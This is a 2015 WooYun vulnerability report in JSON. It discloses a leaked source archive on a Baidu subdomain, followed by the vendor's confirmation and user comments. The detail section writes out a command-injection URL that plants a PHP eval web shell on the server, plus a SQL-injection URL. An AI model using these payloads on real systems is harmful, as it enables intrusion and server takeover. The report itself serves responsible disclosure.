{"id": 44746, "wybug_id": "wooyun-2015-098871", "wybug_title": "百度某源码泄露可造成shell", "wybug_corp": "百度", "wybug_author": "Jannock", "wybug_date": "2015-03-01 10:49", "wybug_open_date": "2015-04-15 10:50", "wybug_type": "敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "源代码泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-15：\t细节向公众公开  简要描述： 神器监测到某运维失误。之后大家猜。。。 详细说明：  url：http://ge.baidu.com/wse.tarDate: Sat, 28 Feb 2015 03:48:39 GMTServer: ApacheContent-Location: wse.tar.gzVary: negotiate,Accept-Encoding,User-AgentTCN: choiceLast-Modified: Fri, 21 Nov 2014 10:15:06 GMTETag: \"a4006-524cbc4c-5085bb805fe80;5085bb3044180\"Accept-Ranges: bytesContent-Length: 1380760652Connection: closeContent-Type: application/x-gzip比较大的包，不过还是下载下来了。经过简单的审计，发现不少问题。可以直接命令执行。命令执行：http://ge.baidu.com/index.php/wse/callBack/DiffReCrawlCallBack/?evaluation_id=7072&taskId=7993&diff_num=1;echo%20xxx%27%3C?php%20eval%28$_POST[c]%29;?%3E%27%20%3E%20/home/work/wse-platform/bin/wse/x.php;echo%201%23上面那两个id 是只有 status !=2 或 3时才实现的。这里可以注入获取其中一个注入点：http://ge.baidu.com/index.php/wse/patchPageShow/contEvalPageShow?evaluation_id=111&label_env_id=111&query_name=aaa%27or%201=1%20limit%201%23这个是时间盲注。程序问题还是比较多的。你们深入修复下吧。   漏洞证明：  \n\n\n\n   修复方案：  运维注意些细节，哈。。   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-02 21:21 厂商回复： 感谢提交，已通知业务部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-01 10:52 |    \t\tMik3y_14 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:29        | 愿君多采撷，此物最相思。)\t\t \n  都有神器T.T    \n     2015-03-01 12:16 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  其实第一次要我写程序我是拒绝的，因为，你不能让我写，我就马上去写，第一我要学一下，因为我不愿意写完了以后再查出一些bug出来，数据库duang一下被爆了，很黑、很卡，这样用户出来一定会骂我，根本没有这样的程序，就证明程序猿都是假的。后来我也经过证实程序确实是有漏洞的，我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n     2015-03-01 13:10 |    \t\tMe_Fortune \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:71        | I'm Me_Fortune)\t\t \n  baidu哭晕在厕所里    \n     2015-03-01 13:30 |    \t\tCatsay \t\t\t( 实习白帽子  |\t\t\t        Rank:85 漏洞数:16        | 屌丝一枚)\t\t \n  神器、、、    \n     2015-03-01 13:44 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  求神器！    \n     2015-03-01 14:01 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  其实第一次要我写程序我是拒绝的，因为，你不能让我写，我就马上去写，第一我要学一下，因为我不愿意写完了以后再查出一些bug出来，数据库duang一下被爆了，很黑、很卡，这样用户出来一定会骂我，根本没有这样的程序，就证明程序猿都是假的。后来我也经过证实程序确实是有漏洞的，我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n     2015-03-01 15:17 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  等待你到百度做内应。给大伙儿……    \n     2015-03-01 16:11 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:178 漏洞数:48        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  最近百度流年不利啊    \n     2015-03-01 17:41 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1301 漏洞数:398        | 某安全公司招聘系统运维、渗透测试、安全运...)\t\t \n  沙发    \n     2015-03-01 18:04 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  其实第一次要我写程序我是拒绝的，因为，你不能让我写，我就马上去写，第一我要学一下，因为我不愿意写完了以后再查出一些bug出来，数据库duang一下被爆了，很黑、很卡，这样用户出来一定会骂我，根本没有这样的程序，就证明程序猿都是假的。后来我也经过证实程序确实是有漏洞的，我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n     2015-03-01 18:05 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  其实第一次要我挖洞我是拒绝的 因为，你不能让我挖，我就马上去挖，第一我要学一下 因为我不愿意挖完了以后再查出一些bug出来 数据库duang一下被爆了，很黑、很卡，这样厂商出来一定会骂我 根本没有这样的修复方案，就证明白帽子都是假的.后来我也经过证实这样确实可以修复漏洞。我挖了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加waf，因为我要让黑帽看到，我挖完之后是这个样子，你们挖完之后也会是这个样子！    \n     2015-03-01 18:30 |    \t\t90Snake \t\t\t( 普通白帽子  |\t\t\t        Rank:109 漏洞数:42        | 最大的漏洞就是人)\t\t \n  @0x 80 好一个沙发    \n     2015-03-02 09:07 |    \t\t发条橙子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:6        | ∑(っ °Д °;)っ)\t\t \n  其实第一次要我写程序我是拒绝的，因为，你不能让我写，我就马上去写，第一我要学一下，因为我不愿意写完了以后再查出一些bug出来，数据库duang一下被爆了，很黑、很卡，这样用户出来一定会骂我，根本没有这样的程序，就证明程序猿都是假的。后来我也经过证实程序确实是有漏洞的，我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n     2015-03-03 09:49 |    \t\tsuperbing \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:29        | 常羡古时儿女怀，嘻戏千山好自在。)\t\t \n  我写了大概一个月左右，感觉还不错，后来我在上线的时候也要求他们不要加防火墙，因为我要让用户看到，我用完之后是这个样子，你们用完之后也会是这个样子！    \n     2015-04-02 16:55 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  求拜师    \n     2015-04-02 17:06 |    \t\tQiudays \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:9        | 感觉自己萌萌哒)\t\t \n  求神器    \n     2015-04-15 12:32 |    \t\tUnravel \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 来到这个世界上，即使是天使都会做坏事。)\t\t \n  好奇是什么神器？    \n     2015-04-15 15:27 |    \t\t我的滑板鞋 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 我的滑板鞋时尚最时尚)\t\t \n  好奇是什么神器？    \n     2015-04-15 16:26 |    \t\tddy \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:16        | 其实第一次要我挖洞我是拒绝的。因为，你不...)\t\t \n  好奇是什么神器？    \n     2015-04-17 16:56 |    \t\tToom \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 啊)\t\t \n  好奇是什么神器？    \n     2015-04-18 13:31 |    \t\t静默 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:6        | 安全小白)\t\t \n  日站都用神器，我们小白用什么啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}